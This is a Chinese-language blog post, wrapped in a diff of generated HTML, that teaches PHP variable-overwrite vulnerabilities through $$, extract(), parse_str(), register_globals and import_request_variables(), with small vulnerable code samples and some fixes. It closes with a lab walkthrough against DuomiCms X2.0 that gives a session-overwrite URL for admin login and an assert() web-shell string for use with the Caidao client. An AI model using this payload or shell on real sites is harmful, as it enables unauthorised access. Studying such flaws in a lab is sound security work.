@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>变量覆盖 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。 常见的变量覆盖全局变量覆盖register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会">
+<meta property="og:type" content="article">
+<meta property="og:title" content="变量覆盖">
+<meta property="og:url" content="http://yoursite.com/2019/11/03/变量覆盖/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。 常见的变量覆盖全局变量覆盖register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-11-03T09:26:36.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="变量覆盖">
+<meta name="twitter:description" content="变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。 常见的变量覆盖全局变量覆盖register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-变量覆盖" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/11/03/变量覆盖/" class="article-date">
+  <time datetime="2019-11-03T09:26:11.000Z" itemprop="datePublished">2019-11-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      变量覆盖
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。</p>
+<p>常见的变量覆盖<br>全局变量覆盖<br>register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会被直接的注册为全局变量直接使用，而Off的时候，我们需要到特定的数组里去得到它。</p>
+<?php 
+//?id=1
+echo "Register_globals: ".(int)ini_get("register_globals")."<br/>"; 
+echo '$_GET["id"] :'.$_GET['id']."<br>";
+echo '$id :'.$id;
+?>
+<p>当register_globals=Off的时候，下一个程序接收的时候应该用$_GET[‘id’]来接受传递过来的值；</p>
+<p>当register_globals=On的时候，下一个程序可以直接使用$id来接受值,也可以用$_GET[‘id’]来接受传递过来的值。</p>
+<p>tips：如果上面的代码中，已经对变量$id赋了初始值，比如$id=0，那么即使在URL中有/test.php?id=1，也不会将变量覆盖，id值为0</p>
+<?php 
+echo "Register_globals: ".(int)ini_get("register_globals")."<br/>"; 
+if (ini_get('register_globals')) foreach($_REQUEST as $k=>$v) unset(${$k}); 
+print $a."<br>"; 
+print $_GET[b]; 
+?>
+<p>在register_globals=ON时,</p>
+<p>提交/test.php?a=1&amp;b=2 , 变量$a未初始化,$_GET[b]=2</p>
+<p>提交/test.php??GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2</p>
+<p>tips:　从 PHP » 4.2.0 版开始配置文件中 PHP 指令 register_globals 的默认值从 on 改为 off 了,自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</p>
+<p>$$导致的变量覆盖<br>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?id=1 会将$id的值覆盖，$id=1。</p>
+<?php
+foreach (array('_COOKIE','_POST','_GET') as $_request) 
+{
+ foreach ($$_request as $_key=>$_value) 
+ {
+ $$_key= $_value;
+ }
+}
+$id = isset($id) ? $id : 2;
+if($id == 1) {
+ echo "flag{xxxxxxxxxx}";
+ die();
+}
+echo $id;
+?>
+<p>extract()变量覆盖<br>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。<br>针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>该函数返回成功设置的变量数目。<br>语法<br>extract(array,extract_rules,prefix)<br>参数 描述<br>array必需。 规定要使用的数组。<br>extract_rules可选。 extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。<br>可能的值：<br>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。<br>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。<br>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。<br>EXTR_PREFIX_INVALID -仅在不合法或数字变量名前加上前缀 prefix。<br>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。<br>prefix可选。 如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。<br>该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</p>
+<p>代码示例：将键值 “Cat”、”Dog” 和 “Horse” 赋值给变量 $a、$b 和 $c</p>
+<?php
+$a = "Original";
+$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
+extract($my_array);
+echo "\$a = $a; \$b = $b; \$c = $c";
+?>
+<p>//运行结果：$a = Cat; $b = Dog; $c = Horse<br><?php
+$id=1; 
+extract($_GET);
+echo $id;
+?><br>//提交：?id=123<br>//结果： 123<br>tips: 在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖 extract($_GET,EXTR_SKIP);</p>
+<p>parse_str()变量覆盖<br>parse_str()函数把查询字符串解析到变量中，并且不会验证当前变量是否已经存在。<br>语法<br>parse_str(string,array)<br>参数 描述<br>string必需。 规定要解析的字符串。<br>array可选。 规定存储变量的数组名称。该参数指示变量存储到数组中</p>
+<p>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。<br>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</p>
+<?php
+parse_str("a=1");
+echo $a."<br/>"; //$a=1
+parse_str("b=1&c=2",$myArray);
+print_r($myArray); //Array ( [c] => 1 [b] => 2 ) 
+?>
+<p>import_request_variables()变量覆盖<br>import_request_variables—将 GET／POST／Cookie 变量导入到全局作用域中import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候<br>语法<br>import_request_variables(string$types[,string$prefix] )<br>$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀</p>
+<?php
+$auth='0';
+import_request_variables('G');
+if($auth== 1){
+echo"private!";
+}else{
+echo"public!";
+}
+?>
+<p>get auth=1时，网页上会输出private！import_request_variables(‘G’)指定导入GET请求中的变量，从而导致变量覆盖。</p>
+<p>靶场实践<br>靶场环境：DuomiCmsX2.0<br>使用工具：seay源码审计系统<br>我们可以使用seay代码审计工具去快速寻找到危险函数，这里我可以添加一个关于$$ 变量覆盖的正则匹配规则。</p>
+<p>([^$“]|$)${?$</p>
+<p>然后自动审计一下可能存在的漏洞</p>
+<p>最后经过寻找，在这里发现了foeach和$$的变量覆盖</p>
+<p>看了一下，也就看到了一个危险函数，和一些传参，然后我们看一下有没有哪个文件调用了这个文件。</p>
+<p>我们找到login.php,发现它调用了common.php和check.admin.php</p>
+<p>而我们发现check.admin.php好像通过获取用户登录时的session来判断了用户的权限，而在admin.manager.php中有一个这样的判断</p>
+<p>直接根据判断用户传进来的$groupid进行身份验证。而这三个session真实的名字叫做这样的</p>
+<p>根据之前commo.php的文件中有session的变量覆盖漏洞，我们可以通过构造POC使得duomi_group_id=1,就可以登录系统管理员，POC如下：</p>
+<p>interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin</p>
+<p>就是在这里给服务器传session值</p>
+<p>报错，然后退回去看一下</p>
+<p>很明显，成功登录管理员，进入后台。</p>
+<p>寻找上传点，在全局的百度推送中上传shell</p>
+<p>“;assert($_eval[‘DS’]);并用菜刀连获取flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/11/03/变量覆盖/" data-id="ck2ixd3yo000uukv0hq0zxouo" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/11/03/平行越权、垂直越权/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">平行越权、垂直越权</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/11/03/变量覆盖/">变量覆盖</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/平行越权、垂直越权/">平行越权、垂直越权</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/支付漏洞/">支付漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/验证码绕过、密码找回漏洞/">验证码绕过、密码找回漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/unserialize反序列化漏洞/">unserialize反序列化漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
